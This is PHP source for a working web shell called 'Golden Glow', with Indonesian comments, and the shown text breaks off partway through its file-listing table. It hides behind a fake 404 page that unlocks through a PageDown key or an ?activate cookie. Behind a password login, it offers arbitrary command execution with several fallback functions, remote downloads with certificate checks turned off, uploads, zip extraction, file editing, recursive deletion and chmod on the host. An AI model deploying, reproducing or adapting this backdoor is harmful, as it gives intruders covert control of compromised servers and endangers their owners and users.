<?php
// Ganti dengan hash password Anda sendiri
$valid_password_hash = '$2a$12$s1tSpKItA2EJCBVFROIytuLD7QoGqbvfI.EPWegThVewrs.oSaqrO';

session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit", "512M");
ini_set("max_execution_time", "600");
ini_set("post_max_size", "500M");
ini_set("upload_max_filesize", "500M");

$session_name = 'SHELL_' . md5(__FILE__);
@session_name($session_name);

// ========== HALAMAN 404 TRICK ==========
$shell_activated = isset($_COOKIE['shell_activated']) && $_COOKIE['shell_activated'] === 'true';
$is_logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

if (isset($_GET['activate'])) {
    setcookie('shell_activated', 'true', time() + 3600, '/');
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!$shell_activated && !$is_logged_in) {
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html>
    <head><title>404 Not Found</title>
    <style>
        body {
            background: #0a0a14;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            position: relative;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1a0b2e, #2d1b4e);
            opacity: 1;
            z-index: 0;
        }
        .err {
            text-align: center;
            z-index: 1;
            position: relative;
        }
        .err h1 {
            font-size: 80px;
            color: #ffcc00;
            margin: 0;
            font-weight: normal;
            text-shadow: 0 0 20px rgba(255,204,0,0.5);
        }
        .err p {
            font-size: 20px;
            color: #ffcc88;
            margin-top: 10px;
        }
    </style>
    </head>
    <body>
        <div class="err">
            <h1>404</h1>
            <p>PAGE NOT FOUND</p>
        </div>
        <script>
            document.addEventListener("keydown", function(e){
                if(e.key === "PageDown"){
                    window.location.href = window.location.pathname + "?activate=1";
                }
            });
        </script>
    </body>
    </html>';
    exit;
}

// ========== AUTENTIKASI ==========
if (isset($_POST['shell_pass'])) {
    if (password_verify($_POST['shell_pass'], $valid_password_hash)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode(getcwd()));
        exit;
    } else {
        $login_error = "WRONG PASSWORD!";
    }
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ Golden Glow</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: url('https://i.ibb.co/wZxpC9PP/22.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Orbitron', monospace;
            min-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: 0;
        }
        .login-container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
            z-index: 2;
            margin: 0 auto;
            transform: translateY(60px);
        }
        .glass-card {
            background: rgba(10, 10, 20, 0.7);
            backdrop-filter: blur(15px);
            border-radius: 32px;
            padding: 45px 35px;
            text-align: center;
            border: 1px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 215, 0, 0.15);
        }
        .title {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #ffcc00, #ff8800, #ff4400);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        .subtitle {
            font-size: 11px;
            letter-spacing: 3px;
            color: #ffcc88;
            margin-bottom: 30px;
            text-transform: uppercase;
        }
        .error-msg {
            background: rgba(220, 60, 60, 0.2);
            border: 1px solid #dc3c3c;
            color: #ff8888;
            padding: 10px;
            margin-bottom: 25px;
            border-radius: 60px;
            font-size: 12px;
            font-weight: 600;
        }
        .input-group {
            margin-bottom: 25px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 20px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: 60px;
            color: #ffffff;
            font-size: 14px;
            font-family: 'Inter', monospace;
            text-align: center;
            transition: all 0.3s;
            font-weight: 500;
        }
        .input-group input:focus {
            outline: none;
            border-color: #ffcc00;
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
        }
        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ffcc00, #ff8800);
            border: none;
            border-radius: 60px;
            color: #0a0b14;
            font-size: 15px;
            font-weight: 800;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 1px;
        }
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.3);
            filter: brightness(1.05);
        }
        .footer {
            margin-top: 30px;
            color: rgba(255, 204, 136, 0.6);
            font-size: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="glass-card">
            <div class="title">Golden Glow</div>
            <div class="subtitle"></div>
            <?php if (isset($login_error)): ?>
            <div class="error-msg"><?php echo $login_error; ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="input-group">
                    <input type="password" name="shell_pass" placeholder="ENTER PASSWORD" autocomplete="off" autofocus>
                </div>
                <button type="submit" class="login-btn">LOGIN</button>
            </form>
            <div class="footer">Your only limit is your mind</div>
        </div>
    </div>
</body>
</html>
    <?php
    exit;
}

// ========== FUNGSI UTILITAS ==========
function getCurrentDir() {
    static $dir = null;
    if ($dir === null) {
        $dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
        if (!is_dir($dir)) $dir = getcwd();
        if (!is_dir($dir)) $dir = dirname(__FILE__);
        if (!is_dir($dir)) $dir = '.';
        $dir = str_replace('\\', '/', realpath($dir));
        if ($dir === false) $dir = '.';
        $dir = rtrim($dir, '/') . '/';
    }
    return $dir;
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function sanitizeFilename($name) {
    $name = str_replace(['../', '..\\', './', '.\\'], '', $name);
    $name = preg_replace('/[^\w\-\.\(\)\s]/i', '_', $name);
    $name = preg_replace('/_+/', '_', $name);
    $name = trim($name, '._- ');
    if (empty($name)) $name = 'file_' . time();
    return $name;
}

function executeCommand($cmd, $cwd = null) {
    $cwd = $cwd ?: getCurrentDir();
    $cmd = trim($cmd);
    if (empty($cmd)) return "";
    
    if (preg_match('/^\s*cd\s+(.+)$/i', $cmd, $matches)) {
        $newDir = trim($matches[1]);
        $fullPath = '';
        if ($newDir == '..') { $fullPath = dirname(rtrim($cwd, '/')); }
        elseif ($newDir == '.' || $newDir == './') { $fullPath = $cwd; }
        elseif ($newDir == '~' || $newDir == '~/') { $fullPath = $_SERVER['HOME'] ?? '/tmp'; }
        elseif ($newDir[0] == '/') { $fullPath = $newDir; }
        else { $fullPath = $cwd . $newDir; }
        
        if (is_dir($fullPath)) { $_GET['d'] = $fullPath; return "Directory changed to: " . realpath($fullPath); }
        else { return "Directory not found: " . $newDir; }
    }
    
    if (preg_match('/^(wget|curl)/i', $cmd)) { return handleDownloadCommand($cmd, $cwd); }
    
    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' 2>/dev/null; ' . $cmd . ' 2>&1';
    $output = '';
    if (function_exists('shell_exec')) { $output = @shell_exec($fullCmd); }
    if (empty($output) && function_exists('exec')) { @exec($fullCmd, $out, $code); $output = implode("\n", $out); }
    if (empty($output) && function_exists('system')) { ob_start(); @system($fullCmd, $code); $output = ob_get_clean(); }
    if (empty($output) && function_exists('passthru')) { ob_start(); @passthru($fullCmd, $code); $output = ob_get_clean(); }
    if (empty($output) && function_exists('proc_open')) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = @proc_open($fullCmd, $descriptors, $pipes, $cwd);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
            if ($error && empty($output)) $output = $error;
        }
    }
    return trim($output) ?: "(no output)";
}

function handleDownloadCommand($cmd, $cwd) {
    preg_match('/https?:\/\/[^\s]+/i', $cmd, $matches);
    $url = $matches[0] ?? '';
    if (!$url) return "Error: No URL found in command";
    
    $filename = null;
    if (preg_match('/-O\s+([^\s]+)/i', $cmd, $match)) { $filename = sanitizeFilename($match[1]); }
    elseif (preg_match('/-o\s+([^\s]+)/i', $cmd, $match)) { $filename = sanitizeFilename($match[1]); }
    else { $filename = sanitizeFilename(basename(parse_url($url, PHP_URL_PATH))); if (empty($filename)) $filename = 'downloaded_' . time() . '.bin'; }
    
    $target = rtrim($cwd, '/') . '/' . $filename;
    $content = false;
    
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false], 'http' => ['timeout' => 60, 'user_agent' => 'Mozilla/5.0']]);
        $content = @file_get_contents($url, false, $context);
    }
    
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    if ($content !== false && file_put_contents($target, $content)) { @chmod($target, 0644); return "Download successful: " . $filename . " (" . formatBytes(strlen($content)) . ")"; }
    return "Download failed: " . $url;
}

function handleUpload($files, $targetDir) {
    if (isset($files['name']) && !is_array($files['name'])) {
        $files = [ 'name' => [$files['name']], 'tmp_name' => [$files['tmp_name']], 'error' => [$files['error']], 'size' => [$files['size']] ];
    }
    $uploaded = [];
    foreach ($files['name'] as $i => $name) {
        if ($files['error'][$i] !== UPLOAD_ERR_OK) continue;
        $cleanName = sanitizeFilename(basename($name));
        $target = rtrim($targetDir, '/') . '/' . $cleanName;
        if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);
        if (@move_uploaded_file($files['tmp_name'][$i], $target)) { @chmod($target, 0644); $uploaded[] = $cleanName; }
        elseif (@copy($files['tmp_name'][$i], $target)) { @unlink($files['tmp_name'][$i]); @chmod($target, 0644); $uploaded[] = $cleanName; }
    }
    return $uploaded;
}

function extractArchive($zipPath, $extractTo, $deleteAfter = true) {
    $results = [];
    if (!file_exists($zipPath)) { return ["Archive not found: " . basename($zipPath)]; }
    if (!is_dir($extractTo)) @mkdir($extractTo, 0755, true);
    $extracted = false;
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === TRUE) { if ($zip->extractTo($extractTo)) { $results[] = "Extracted: " . $zip->numFiles . " files from " . basename($zipPath); $extracted = true; } $zip->close(); }
    }
    
    if (!$extracted && function_exists('shell_exec')) {
        $cmd = 'cd ' . escapeshellarg($extractTo) . ' && unzip -o ' . escapeshellarg($zipPath) . ' 2>&1';
        $output = @shell_exec($cmd);
        if ($output && (strpos($output, 'inflating') !== false || strpos($output, 'extracting') !== false)) { $results[] = "Extracted via command line: " . basename($zipPath); $extracted = true; }
    }
    
    if ($extracted && $deleteAfter) { @unlink($zipPath); $results[] = "Original archive deleted"; }
    elseif (!$extracted) { $results[] = "Failed to extract: " . basename($zipPath); }
    return $results;
}

// ========== MAIN DASHBOARD ==========
$currentDir = getCurrentDir();
$messages = isset($_SESSION['messages']) ? $_SESSION['messages'] : [];
$commandOutput = isset($_SESSION['command_output']) ? $_SESSION['command_output'] : '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create_action'])) {
        $name = sanitizeFilename($_POST['name'] ?? '');
        $type = $_POST['type'] ?? 'file';
        $content = $_POST['content'] ?? '';
        if ($name) {
            $path = $currentDir . $name;
            if ($type === 'file') {
                if (file_put_contents($path, $content)) { @chmod($path, 0644); $messages[] = "File created: " . $name; }
                else { $messages[] = "Failed to create file: " . $name; }
            } else {
                if (@mkdir($path, 0755, true)) { $messages[] = "Folder created: " . $name; }
                else { $messages[] = "Failed to create folder: " . $name; }
            }
        }
    }
    
    if (!empty($_FILES['files'])) { $uploaded = handleUpload($_FILES['files'], $currentDir); if (!empty($uploaded)) { $messages[] = "Uploaded: " . implode(', ', $uploaded); } }
    if (!empty($_FILES['archive']) && $_FILES['archive']['error'] === UPLOAD_ERR_OK) {
        $tmpPath = $_FILES['archive']['tmp_name'];
        $tempSave = $currentDir . 'temp_' . time() . '.zip';
        if (copy($tmpPath, $tempSave)) { $extractResults = extractArchive($tempSave, $currentDir, true); $messages = array_merge($messages, $extractResults); }
        else { $extractResults = extractArchive($tmpPath, $currentDir, false); $messages = array_merge($messages, $extractResults); }
    }
    if (isset($_POST['download_url']) && !empty($_POST['download_url'])) {
        $url = trim($_POST['download_url']);
        $filename = !empty($_POST['download_name']) ? sanitizeFilename($_POST['download_name']) : '';
        $cmd = 'wget ' . $url; if ($filename) $cmd .= ' -O ' . $filename;
        $result = handleDownloadCommand($cmd, $currentDir); $messages[] = $result;
    }
    if (isset($_POST['command']) && trim($_POST['command'])) { $commandOutput = executeCommand($_POST['command'], $currentDir); }
    if (isset($_POST['edit_content']) && isset($_POST['edit_file'])) { $target = $currentDir . basename($_POST['edit_file']); if (file_put_contents($target, $_POST['edit_content'])) { $messages[] = "Saved: " . basename($target); } }
    if (isset($_POST['delete_selected']) && isset($_POST['selected_items'])) { $deleted = 0; foreach ($_POST['selected_items'] as $item) { $target = $currentDir . basename($item); if (file_exists($target)) { if (is_dir($target)) { executeCommand('rm -rf ' . escapeshellarg($target), $currentDir); } else { @unlink($target); } $deleted++; } } $messages[] = "Deleted " . $deleted . " item(s)"; }
    if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) { $old = $currentDir . basename($_POST['rename_old']); $new = $currentDir . sanitizeFilename($_POST['rename_new']); if (file_exists($old) && !file_exists($new) && rename($old, $new)) { $messages[] = "Renamed: " . basename($old) . " to " . basename($new); } }
    if (isset($_POST['chmod_file']) && isset($_POST['chmod_value'])) { $target = $currentDir . basename($_POST['chmod_file']); $perms = octdec($_POST['chmod_value']); if (file_exists($target) && @chmod($target, $perms)) { $messages[] = "Changed permissions: " . basename($target) . " to " . $_POST['chmod_value']; } }
    
    $_SESSION['messages'] = $messages;
    $_SESSION['command_output'] = $commandOutput;
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['delete'])) { $target = $currentDir . basename($_GET['delete']); if (file_exists($target)) { if (is_dir($target)) { executeCommand('rm -rf ' . escapeshellarg($target), $currentDir); } else { @unlink($target); } $messages[] = "Deleted: " . basename($target); $_SESSION['messages'] = $messages; header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir)); exit; } }
if (isset($_GET['extract'])) { $target = $currentDir . basename($_GET['extract']); if (file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') { $results = extractArchive($target, $currentDir, true); $messages = array_merge($messages, $results); $_SESSION['messages'] = $messages; header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($currentDir)); exit; } }
if (isset($_GET['edit'])) { $editFile = basename($_GET['edit']); $editContent = @file_get_contents($currentDir . $editFile); }
if (isset($_GET['logout'])) { session_destroy(); header("Location: " . $_SERVER['PHP_SELF']); exit; }

$_SESSION['messages'] = $messages;

$items = @scandir($currentDir);
$dirs = []; $files = [];
if (is_array($items)) { foreach ($items as $item) { if ($item == '.' || $item == '..') continue; $path = $currentDir . $item; if (is_dir($path)) $dirs[] = $item; else $files[] = $item; } sort($dirs); sort($files); }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ Golden Glow</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: url('https://i.ibb.co/wZxpC9PP/22.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            position: relative;
            padding: 20px;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            background-attachment: fixed;
            opacity: 1;
            z-index: 0;
        }
        .main-wrapper {
            max-width: 1600px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }
        .glass-card {
            background: rgba(35, 35, 55, 0.8);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            border: 1px solid rgba(255, 215, 0, 0.35);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
            transition: all 0.2s ease;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            margin-bottom: 25px;
            background: rgba(35, 35, 55, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 50px;
            border: 1px solid rgba(255, 215, 0, 0.45);
        }
        .logo h1 {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(135deg, #ffcc00, #ff8800);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }
        .nav-buttons {
            display: flex;
            gap: 12px;
        }
        .nav-btn {
            background: rgba(255, 204, 0, 0.2);
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 215, 0, 0.4);
            color: #ffcc00;
            text-decoration: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-size: 12px;
            font-weight: 600;
            transition: 0.2s;
        }
        .nav-btn:hover {
            background: #ffcc00;
            color: #0a0b14;
            transform: translateY(-2px);
            border-color: #ffcc00;
        }
        .path-bar {
            padding: 14px 24px;
            margin-bottom: 25px;
            font-size: 13px;
            font-family: monospace;
            background: rgba(35, 35, 55, 0.75);
            backdrop-filter: blur(8px);
            border-radius: 50px;
            color: #ffeedd;
        }
        .path-bar a {
            color: #ffcc00;
            text-decoration: none;
            font-weight: 600;
        }
        .message {
            background: rgba(255, 204, 0, 0.2);
            backdrop-filter: blur(8px);
            border-left: 4px solid #ffcc00;
            padding: 12px 20px;
            margin-bottom: 12px;
            border-radius: 16px;
            font-size: 12px;
            color: #fff0cc;
            font-weight: 500;
        }
        .tools-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 18px;
            margin-bottom: 30px;
        }
        .tool-card {
            background: rgba(35, 35, 55, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            overflow: hidden;
            border: 1px solid rgba(255, 215, 0, 0.35);
        }
        .tool-card .tool-title {
            background: rgba(255, 204, 0, 0.15);
            padding: 12px 16px;
            font-weight: 700;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: #ffcc00;
            border-bottom: 1px solid rgba(255, 215, 0, 0.25);
        }
        .tool-body {
            padding: 16px;
        }
        .tool-body input, .tool-body select, .tool-body textarea {
            width: 100%;
            padding: 10px 14px;
            margin-bottom: 12px;
            background: rgba(255, 255, 255, 0.12);
            border: 1px solid rgba(255, 215, 0, 0.4);
            border-radius: 40px;
            color: #ffffff;
            font-size: 12px;
            transition: 0.2s;
        }
        .tool-body input:focus, .tool-body select:focus, .tool-body textarea:focus {
            outline: none;
            border-color: #ffcc00;
            background: rgba(255, 255, 255, 0.2);
        }
        .tool-body input::placeholder, .tool-body textarea::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        .tool-body button, .terminal-btn-small {
            width: 100%;
            padding: 10px;
            background: linear-gradient(135deg, #ffcc00, #ff8800);
            border: none;
            border-radius: 40px;
            color: #0a0b14;
            font-weight: 800;
            cursor: pointer;
            font-size: 12px;
            transition: 0.2s;
        }
        .tool-body button:hover, .terminal-btn-small:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
            box-shadow: 0 5px 15px rgba(255, 204, 0, 0.3);
        }
        .file-table {
            background: rgba(35, 35, 55, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            overflow-x: auto;
            margin-bottom: 25px;
            border: 1px solid rgba(255, 215, 0, 0.35);
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 14px 16px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 215, 0, 0.15);
            font-size: 12px;
            color: #f0f0f0;
        }
        th {
            background: rgba(255, 204, 0, 0.15);
            color: #ffcc00;
            font-weight: 700;
        }
        tr:hover {
            background: rgba(255, 204, 0, 0.08);
        }
        .folder-link, .file-link {
            text-decoration: none;
            font-weight: 600;
        }
        .folder-link { color: #ffcc00; }
        .file-link { color: #88ccff; }
        .action-btn {
            padding: 4px 10px;
            border-radius: 40px;
            font-size: 10px;
            font-weight: 600;
            display: inline-block;
            margin-right: 6px;
            transition: 0.2s;
            text-decoration: none;
        }
        .action-btn.edit { background: rgba(255, 204, 0, 0.25); color: #ffcc00; border: 1px solid rgba(255, 204, 0, 0.4); }
        .action-btn.delete { background: rgba(220, 60, 60, 0.3); color: #ffaaaa; border: 1px solid rgba(220, 60, 60, 0.4); }
        .action-btn.extract { background: rgba(34, 197, 94, 0.3); color: #aaffaa; border: 1px solid rgba(34, 197, 94, 0.4); }
        .action-btn.open { background: rgba(59, 130, 246, 0.3); color: #aaccff; border: 1px solid rgba(59, 130, 246, 0.4); }
        .action-btn:hover { transform: translateY(-1px); filter: brightness(1.1); }
        .delete-selected-btn {
            margin: 15px 20px 20px;
            padding: 8px 18px;
            background: linear-gradient(135deg, #dc2626, #991b1b);
            border: none;
            border-radius: 40px;
            color: white;
            font-weight: 700;
            cursor: pointer;
        }
        .terminal-output-bottom {
            background: rgba(35, 35, 55, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            margin-top: 25px;
            overflow: hidden;
            border: 1px solid rgba(255, 215, 0, 0.35);
        }
        .terminal-output-title {
            background: rgba(255, 204, 0, 0.15);
            padding: 12px 20px;
            font-weight: 700;
            color: #ffcc00;
            border-bottom: 1px solid rgba(255, 215, 0, 0.25);
        }
        .terminal-output-content {
            padding: 20px;
            background: rgba(0, 0, 0, 0.25);
            font-family: monospace;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            color: #ccffaa;
        }
        .editor {
            background: rgba(35, 35, 55, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid rgba(255, 215, 0, 0.35);
        }
        .editor h3 {
            color: #ffcc00;
            margin-bottom: 15px;
        }
        .editor textarea {
            width: 100%;
            height: 400px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 215, 0, 0.4);
            border-radius: 20px;
            padding: 16px;
            font-family: monospace;
            color: #ffffff;
        }
        .editor button {
            margin-top: 15px;
            padding: 10px 24px;
            background: linear-gradient(135deg, #ffcc00, #ff8800);
            border: none;
            border-radius: 40px;
            color: #0a0b14;
            font-weight: 700;
            cursor: pointer;
        }
        .editor a {
            color: #ffcc00;
            text-decoration: none;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(6px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: rgba(35, 35, 55, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            border: 1px solid rgba(255, 215, 0, 0.5);
        }
        .modal-content h3 { margin-bottom: 20px; color: #ffcc00; }
        .modal-content input {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            border-radius: 60px;
            border: 1px solid rgba(255, 215, 0, 0.4);
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
        }
        .modal-content button {
            padding: 8px 20px;
            background: linear-gradient(135deg, #ffcc00, #ff8800);
            border: none;
            border-radius: 40px;
            color: #0a0b14;
            font-weight: 700;
            margin-right: 10px;
            cursor: pointer;
        }
        input[type="checkbox"] { width: 18px; height: 18px; accent-color: #ffcc00; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1a1a2e; border-radius: 4px; }
        ::-webkit-scrollbar-thumb { background: #ffcc00; border-radius: 4px; }
    </style>
</head>
<body>
<div class="main-wrapper">
    <div class="header glass-card">
        <div class="logo">
            <h1>Golden Glow</h1>
        </div>
        <div class="nav-buttons">
            <a href="?d=<?php echo urlencode($currentDir); ?>" class="nav-btn">REFRESH</a>
            <a href="?logout=1" class="nav-btn">EXIT</a>
        </div>
    </div>

    <div class="path-bar glass-card">
        CURRENT PATH: 
        <?php
        $parts = explode('/', trim($currentDir, '/'));
        $current = '';
        echo '<a href="?d=/">/</a>';
        foreach ($parts as $part) {
            if ($part) {
                $current .= '/' . $part;
                echo ' / <a href="?d=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        ?>
    </div>

    <?php if (!empty($messages)): ?>
    <div class="messages">
        <?php foreach ($messages as $msg): ?>
            <div class="message"><?php echo htmlspecialchars($msg); ?></div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <div class="tools-bar">
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-upload"></i> UPLOAD FILE</div>
            <div class="tool-body">
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="files[]" multiple required>
                    <button type="submit">UPLOAD</button>
                </form>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-file-archive"></i> EXTRACT ZIP</div>
            <div class="tool-body">
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="archive" accept=".zip" required>
                    <button type="submit">EXTRACT</button>
                </form>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-terminal"></i> TERMINAL </div>
            <div class="tool-body">
                <form method="POST">
                    <input type="text" name="command" placeholder="Enter command..." autocomplete="off">
                    <button type="submit">RUN</button>
                </form>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-plus-circle"></i> CREATE</div>
            <div class="tool-body">
                <form method="POST">
                    <input type="text" name="name" placeholder="Name" required>
                    <select name="type">
                        <option value="file">File</option>
                        <option value="folder">Folder</option>
                    </select>
                    <textarea name="content" placeholder="File content..." rows="2"></textarea>
                    <button type="submit" name="create_action" value="1">CREATE</button>
                </form>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-cloud-download-alt"></i> REMOTE DL</div>
            <div class="tool-body">
                <form method="POST">
                    <input type="url" name="download_url" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="download_name" placeholder="Filename (optional)">
                    <button type="submit">DOWNLOAD</button>
                </form>
            </div>
        </div>
    </div>

    <div class="file-table glass-card">
        <form method="POST" id="deleteForm">
            <table>
                <thead>
                    <tr><th style="width:40px"><input type="checkbox" id="selectAll"></th><th>NAME</th><th style="width:100px">SIZE</th><th style="width:80px">PERM</th><th style="width:160px">MODIFIED</th><th>ACTIONS</th></tr>
                </thead>
                <tbody>
                    <?php foreach ($dirs as $item):
                        $path = $currentDir . $item;
                        $perms = substr(sprintf('%o', fileperms($path)), -4);
                        $modified = date('Y-m-d H:i:s', filemtime($path));
                    ?>
                    <tr>
                        <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>"></td>
                        <td><div><a href="?d=<?php echo urlencode($path); ?>" class="folder-link"><?php echo htmlspecialchars($item); ?></a></div></td>
                        <td>—</td>
                        <td><?php echo $perms; ?></td>
                        <td><?php echo $modified; ?></td>
                        <td>
                            <a href="#" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($item)); ?>')" class="action-btn edit">RENAME</a>
                            <a href="#" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo $perms; ?>')" class="action-btn edit">CHMOD</a>
                            <a href="?d=<?php echo urlencode($currentDir); ?>&delete=<?php echo urlencode($item); ?>" class="action-btn delete" onclick="return confirm('DELETE FOLDER?')">DEL</a>
                        </td>
                    </tr>
                    <?php endforeach;
                    foreach ($files as $item):
                        $path = $currentDir . $item;
                        $size = filesize($path);
                        $perms = substr(sprintf('%o', fileperms($path)), -4);
                        $modified = date('Y-m-d H:i:s', filemtime($path));
                        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                        $isEditable = $size < 2 * 1024 * 1024 && !in_array($ext, ['zip','jpg','png','gif','jpeg','mp4','mp3','avi','mov','pdf']);
                    ?>
                    <tr>
                        <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>"></td>
